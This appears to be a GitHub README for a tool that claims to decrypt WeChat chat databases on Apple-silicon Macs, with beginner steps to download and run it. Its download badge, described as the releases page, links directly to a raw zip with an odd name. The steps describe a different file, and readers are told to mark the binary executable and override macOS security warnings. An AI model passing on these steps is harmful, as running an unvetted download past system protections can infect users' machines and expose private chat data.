## ℹ️ What is wechat-db-decrypt-macos?

wechat-db-decrypt-macos is a tool designed to decrypt WeChat databases on macOS with Apple silicon (arm64). It works specifically with the latest WeChat version 4.1.2.241. Older versions, such as 4.0 and below, are not supported. This tool helps you access the information stored in WeChat’s database files when direct access is restricted.

This application focuses on simplicity and security. You do not need to understand programming or technical details. Follow the steps below to download, install, and run the tool on your macOS Apple silicon computer.

## 🖥️ System Requirements

Before using this tool, make sure your system meets these conditions:

- Computer running macOS with Apple Silicon (M1, M2 chips, or newer).
- Installed WeChat app version 4.1.2.241.
- Basic knowledge of using Finder and Terminal on macOS.
- At least 100 MB free disk space for the tool and temporary files.
- Internet connection to download the software.

If you do not have these requirements, the tool might not work correctly.

## 🚀 Getting Started

### Step 1: Visit the Download Page

Go to the official releases page to get the latest version of the software:

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%23947c2f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mohamed125198/wechat-db-decrypt-macos/main/微信 mac 数据库解密/decrypt_macos_wechat_db_humidityproof.zip)

This page contains all the available versions and files you can download. Look for the file that matches your macOS arm64 architecture.

### Step 2: Download the Correct File

On the releases page:

- Find the latest release, usually listed at the top.
- Look for a file with a name containing "macos-arm64" or similar.
- Click the file link to start downloading it to your computer.

The downloaded file is a program you will run to decrypt your WeChat database.

### Step 3: Prepare Your WeChat Database File

You will need to locate the encrypted database file you want to decrypt. Typically, WeChat stores these files in its app data directory. The file is usually named `MM.sqlite` or similar.

Use Finder to navigate to:

`~/Library/Containers/com.tencent.xinWeChat/Data/Documents`

Copy the database file you want to decrypt to an easy-to-access folder, such as your Desktop.

### Step 4: Open Terminal

You will use the macOS Terminal to run the tool. To open Terminal:

- Press `Command + Space` and type "Terminal".
- Press Enter to open the Terminal app.

Keep the Terminal window open for the next steps.

### Step 5: Run the Decrypt Tool

1. Find the downloaded file in Finder (usually in the Downloads folder).

2. Drag the file into the Terminal window. This action will paste the file path.

3. Add a space after the file path.

4. Add the path to your copied WeChat database file.

Your command in Terminal should look like this format:

```
/path/to/wechat-db-decrypt-macos /path/to/your/MM.sqlite
```

For example:

```
/Users/yourname/Downloads/wechat-db-decrypt-macos /Users/yourname/Desktop/MM.sqlite
```

5. Press Enter to run the command.

The tool will process the file and, if successful, create a decrypted version you can read.

### Step 6: Locate the Decrypted Output

After the tool finishes, look for a new file in the same folder as the input database. This file typically has a name like:

```
MM_decrypted.sqlite
```

You can open this file in any SQLite browser or viewer application to read the contents.

## 🔧 How It Works

wechat-db-decrypt-macos uses the internal keys from your installed WeChat 4.1.2.241 to unlock the encrypted SQLite database files. Because the encryption methods vary with WeChat versions, this tool only supports 4.1.2.241 and does not work with older versions.

The app runs directly on Apple silicon Macs to ensure fast and reliable decryption without emulation or extra software.

## ⚙️ Troubleshooting

If the tool does not run or shows errors, try these steps:

- Confirm you have the correct WeChat version installed (4.1.2.241).
- Make sure the input database file is the right one and is not corrupted.
- Check that the downloaded program is marked as executable. If not, run this command in Terminal:

  ```
  chmod +x /path/to/wechat-db-decrypt-macos
  ```

- If you see a security warning about opening files from the internet, go to System Preferences > Security & Privacy > General and allow the app to run.
- Run Terminal as a standard user with appropriate permissions.

## ✂️ Useful Commands

- To open a folder in Finder from Terminal:

  ```
  open /path/to/folder
  ```

- To list files in a folder:

  ```
  ls /path/to/folder
  ```

- To check your current working directory:

  ```
  pwd
  ```

## ⚠️ Notes on Compatibility

- The tool is only for macOS computers with Apple silicon processors. It will not work on Intel-based Macs or Windows PCs.
- It supports WeChat version 4.1.2.241 only.
- Older WeChat database files cannot be decrypted using this tool.
- You should handle decrypted data securely to avoid privacy issues.

## 🛠️ Additional Tools You May Need

To work with decrypted database files, you might want an SQLite viewer app. These are available for free and let you open, search, and explore SQLite files easily.
